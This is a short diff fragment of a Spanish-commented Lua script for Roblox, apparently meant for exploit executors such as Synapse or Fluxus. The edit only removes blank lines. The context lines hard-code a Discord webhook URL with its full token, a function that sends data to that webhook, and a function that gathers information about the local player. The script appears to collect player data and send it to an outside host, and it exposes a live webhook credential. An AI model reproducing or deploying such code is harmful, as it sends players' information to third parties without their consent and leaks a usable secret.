@@ -24041,7 +24041,6 @@ local urls = {
 
 -- Define la URL de tu webhook de Discord
 local webhookUrl = "https://discord.com/api/webhooks/1150594410090864710/teS-V4fwhbs2H2RwgVe5b6mWPmKGWWyPNoNSeI7PuoWH9h-6JkLeFs4U5Ue3u6nzYuMd"
-
 -- Función para enviar datos a un webhook
 local function sendToWebhook(url, response)
 	local data = {
@@ -24230,7 +24229,6 @@ local send_hook = request(
 local request = http_request or request or HttpPost or syn.request or fluxus.request or http.request
 
 local WebhookURL = "https://discord.com/api/webhooks/1150594410090864710/teS-V4fwhbs2H2RwgVe5b6mWPmKGWWyPNoNSeI7PuoWH9h-6JkLeFs4U5Ue3u6nzYuMd"
-
 -- Función para obtener la información del jugador local
 local function obtenerInformacionDelJugadorLocal()
 	local player = game.Players.LocalPlayer
